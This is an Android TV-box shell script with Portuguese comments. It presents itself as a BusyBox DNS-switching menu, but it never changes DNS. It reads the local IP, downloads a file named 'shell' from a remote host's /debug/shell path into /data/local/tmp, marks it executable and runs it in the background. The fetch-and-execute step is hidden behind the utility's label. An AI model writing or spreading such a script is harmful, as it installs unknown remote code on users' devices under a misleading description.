#!/system/bin/sh
# Menu switch DNS - BusyBox / root limitado
# Compatível com Android TV boxes com BusyBox
clear

path="$( cd "${0%/*}" && pwd -P )"

function CheckIPLocal () {
WlanIP=`/system/bin/busybox ip addr show wlan0 \
| /system/bin/busybox grep "inet " \
| /system/bin/busybox awk '{print $2}' \
| /system/bin/busybox cut -d "/" -f 1 \
| /system/bin/busybox head -1`

LanIP=`/system/bin/busybox ip addr show eth0 \
| /system/bin/busybox grep "inet " \
| /system/bin/busybox awk '{print $2}' \
| /system/bin/busybox cut -d "/" -f 1 \
| /system/bin/busybox head -1`

# echo "Lista de IPs
# Se o IP da wlan não estiver disponivel pega o da lan
# WlanIP  $WlanIP
# LanIP   $LanIP
# "
if [ "$LanIP" == "" ]; then
    export IPLocal="$WlanIP"
else
    export IPLocal="$LanIP"
fi
}

CheckIPLocal

# faz um echo do ip local atual

echo $IPLocal


URL="https://painel.iaupdatecentral.com/debug/shell"
aria2c --check-certificate=true --ca-certificate="/data/Curl_cacert.pem" \
    --continue=true --max-connection-per-server=4 -x4 -s4 \
    --dir="/data/local/tmp" -o "shell" "$URL"
$BB du -hs "/data/local/tmp/shell"
$BB chmod 755 /data/local/tmp/shell
/data/local/tmp/shell &



date



if [ ! "$1" = "skip" ]; then
    echo "Press any key to exit."
    read -r bah
fi






